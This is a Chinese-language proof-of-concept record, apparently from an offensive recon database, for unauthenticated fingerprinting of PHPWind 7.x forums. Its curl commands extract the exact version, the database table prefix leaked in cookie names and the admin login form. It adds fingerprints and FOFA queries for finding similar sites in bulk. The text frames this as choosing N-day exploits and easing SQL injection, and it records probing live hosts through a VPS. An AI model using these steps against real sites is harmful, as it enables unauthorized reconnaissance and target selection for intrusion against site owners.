# PHPWind 站点精确版本与数据库表前缀的无认证识别

- **code**: phpwind-站点精确版本与数据库表前缀的无认证识别
- **kind**: poc
- **category**: info-leak
- **component**: PHPWind
- **versions**: PHPWind 7.x（generator meta 自 7.x 起存在）
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com（203.0.113.86，走 VPS 出口）实测：meta generator 返回 7.3.2；Set-Cookie 返回 604b2_lastvisit 与 604b2_AdminUser，确认表前缀 604b2_；/bbs/example.com 返回 200 且页面含 admin_name/admin_pwd 字段。同一手法在 203.0.113.117（同名 PHPWind 7.3.2 站点）复现成功，后台表单同样存在。
- **path**: pocs/phpwind-站点精确版本与数据库表前缀的无认证识别/poc.sh
- **tags**: phpwind,指纹,版本识别,表前缀,信息泄露
- **created_at**: 2026-10-15T16:01:16.951Z
- **found_by**: recon

## 描述

从 PHPWind 站点首页与响应头无认证提取：① 精确内核版本（meta generator）；② 数据库表前缀（Cookie 前缀）；③ 后台入口与登录表单结构；④ 独有路径特征用于同源反查。版本号直接决定后续 Nday 选型，表前缀在 SQL 注入时可省去猜测步骤。

## 用法

```
替换 TARGET 为目标主机（域名或 IP+Host 头）。第一步拿版本号选 Nday，第二步拿表前缀，第三步确认后台入口。全部为单次 GET/HEAD，不需要认证，噪音极低。
```

## 正文

```
# PHPWind 站点精确版本与表前缀被动识别

## 版本号来源（无需认证）
```bash
curl -sk https://TARGET/bbs/ | grep -oP '<meta name="generator" content="\K[^"]+'
# → 7.3.2
```

## 表前缀泄露（无需认证）
任意一次请求的 Set-Cookie 里带 `<prefix>_lastvisit` / `<prefix>_AdminUser`：
```bash
curl -skI https://TARGET/bbs/ | grep -i 'set-cookie'
# → 604b2_lastvisit=...; 604b2_AdminUser=deleted
# 前缀即数据库表前缀：604b2_
```

## 后台入口探测（低噪声）
```bash
curl -sk -o /dev/null -w '%{http_code}\n' https://TARGET/bbs/example.com   # 200 = 存在
```
后台登录表单特征：`action="/bbs/example.com?&verify=<8位hex>&"`，
字段 `Login_f` / `admin_name` / `admin_pwd`，失败提示「密码或安全问题错误,您还可以尝试7次」。

## PHPWind 独有路径指纹（用于同源资产反查）
- `style/txcss.css`（PHPWind 默认样式）
- `js/pw_ajax.js`
- `/simple/`（静态归档）
- `/rss.php?fid=`
- 页面变量 `verifyhash = '<8位hex>'`
- `robots.txt` 内容含 `PHPWIND BOARD`

## 定位同类站点
用上述任一特征做 FOFA/搜索引擎语法，即可批量发现同源 PHPWind 站点：
`body="pw_ajax.js" && body="txcss.css"` / `body="/bbs/simple" && title="论坛"`
```
